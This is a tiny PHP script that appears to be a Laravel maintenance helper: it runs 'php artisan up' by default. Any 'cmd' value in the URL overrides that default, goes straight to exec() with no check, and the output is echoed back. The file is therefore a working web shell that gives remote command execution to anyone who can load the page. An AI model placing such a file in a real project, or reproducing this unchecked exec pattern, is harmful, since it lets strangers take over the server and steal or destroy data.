<?php


    $cmd = "php artisan up";
    if(isset($_GET['cmd']) && $_GET['cmd']!=''){
        $cmd = $_GET['cmd'];
    }

    exec("cd.. && ".$cmd, $output);

    echo "<pre>";
    var_dump($output);
    echo "</pre>";
?>
